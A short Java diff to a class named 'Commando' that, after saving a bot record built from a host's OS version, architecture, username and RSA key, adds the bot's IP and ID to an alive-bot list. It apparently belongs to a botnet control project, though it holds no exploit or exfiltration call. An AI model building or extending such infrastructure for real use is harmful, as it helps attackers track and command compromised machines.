@@ -91,6 +91,8 @@ public class Commando {
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
 		bServ.save(bot);
+		Pairs<IP,String> botAlive=new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
+		nServ.getAliveBot().add(botAlive);
 	}
 
 	/**
@@ -132,6 +134,8 @@ public class Commando {
 								objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
 								objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
 						bServ.save(bot);
+						Pairs<IP,String> botAlive=new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
+						nServ.getAliveBot().add(botAlive);
 					}
 				}
 			}
